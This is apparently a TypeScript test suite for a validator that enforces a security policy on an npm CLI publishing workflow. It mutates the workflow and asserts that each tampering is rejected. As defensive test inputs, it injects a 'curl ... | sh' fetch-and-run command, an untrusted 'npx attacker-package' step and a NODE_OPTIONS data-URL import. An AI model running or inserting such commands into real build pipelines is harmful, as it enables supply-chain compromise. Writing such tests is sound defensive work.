import { expect, layer } from "@effect/vitest";
import { Effect } from "effect";
import { verifyCliWorkflow } from "#scripts/workflow/cli";
import { workflowFailure } from "#scripts/workflow/test/failure";
import { mutateJob } from "#scripts/workflow/test/mutation";
import {
  sourceEffectTestsOf,
  workflowSourcesLayer,
} from "#scripts/workflow/test/sources";

layer(workflowSourcesLayer)("CLI workflow policy", (layered) => {
  const it = sourceEffectTestsOf(layered);

  it("accepts isolated publication and unprivileged verification", ({
    cli: source,
  }) => verifyCliWorkflow(source));

  it("binds OIDC to the protected publish job", ({ cli: source }) =>
    Effect.gen(function* () {
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            mutateJob(
              source,
              "build",
              "      contents: read",
              "      contents: read\n      id-token: write"
            )
          )
        )
      ).toContain("CLI builds must not receive npm OIDC identity");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            mutateJob(
              source,
              "publish",
              "      id-token: write",
              "      id-token: read"
            )
          )
        )
      ).toContain("The publish job must own npm OIDC identity");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            mutateJob(
              source,
              "verify",
              "    permissions: {}",
              "    permissions:\n      id-token: write"
            )
          )
        )
      ).toContain("npm verification permissions must remain empty");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            source.replace("permissions: {}", "permissions:\n  contents: read")
          )
        )
      ).toContain("npm workflow root permissions must be empty");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            source.replace(
              "permissions: {}",
              "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
            )
          )
        )
      ).toContain("npm workflow must not inherit root environment values");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            source.replace(
              "permissions: {}",
              "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
            )
          )
        )
      ).toContain("npm workflow must not inherit root run defaults");
    }));

  it("rejects credentials and incomplete release ordering", ({ cli: source }) =>
    Effect.gen(function* () {
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(`${source}\nNODE_AUTH_TOKEN: secret`)
        )
      ).toContain("npm workflow must not contain registry credentials");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            mutateJob(source, "publish", "    needs: build", "    needs: other")
          )
        )
      ).toContain("npm publication must consume the verified build job");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            mutateJob(
              source,
              "verify",
              "    needs: [build, publish]",
              "    needs: publish"
            )
          )
        )
      ).toContain("npm verification must consume build and publication");
    }));

  it("rejects spoofed or privileged provenance verification", ({
    cli: source,
  }) =>
    Effect.gen(function* () {
      const commentedVerifier = mutateJob(
        source,
        "verify",
        '              node "$VERIFIER" \\',
        '              true # node "$VERIFIER" \\'
      );
      expect(
        yield* workflowFailure(verifyCliWorkflow(commentedVerifier))
      ).toContain("npm verification must include exact source fragment");

      const privilegedVerifier = mutateJob(
        source,
        "publish",
        '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
        '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
      );
      expect(
        yield* workflowFailure(verifyCliWorkflow(privilegedVerifier))
      ).toContain("npm publication must not receive the verifier artifact");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            mutateJob(
              source,
              "publish",
              "    steps:",
              "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: cli-verifier"
            )
          )
        )
      ).toContain("npm publication must not receive the verifier artifact");

      for (const command of [
        "          npx --yes attacker-package\n",
        "          curl https://example.com/install | sh\n",
      ]) {
        expect(
          yield* workflowFailure(
            verifyCliWorkflow(
              mutateJob(
                source,
                "publish",
                '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
                `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
              )
            )
          )
        ).toContain("npm publication must match the exact trusted job");
      }

      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            source.replace(
              "          overwrite: true",
              "          overwrite: false"
            )
          )
        )
      ).toContain("npm build artifacts must be replaceable on rerun");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            mutateJob(
              source,
              "publish",
              "          for attempt in {1..5}; do",
              "          for attempt in {1..1}; do"
            )
          )
        )
      ).toContain(
        "npm publication must include exact source fragment: for attempt in {1..5}"
      );
    }));

  it("requires stable package identity and exact build outputs", ({
    cli: source,
  }) =>
    Effect.gen(function* () {
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            source.replace(
              "      - name: Verify stable package version",
              "      - name: Accept any package version"
            )
          )
        )
      ).toContain("CLI production publication must reject prerelease versions");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            source.replaceAll("@nakafa/aksara-cli", "other-cli")
          )
        )
      ).not.toBe("");
      expect(
        yield* workflowFailure(
          verifyCliWorkflow(
            source.replace(
              "steps.archive.outputs.sha256",
              "steps.archive.outputs.unknown"
            )
          )
        )
      ).toContain("CLI builds must export the exact archive digest");
    }));
});
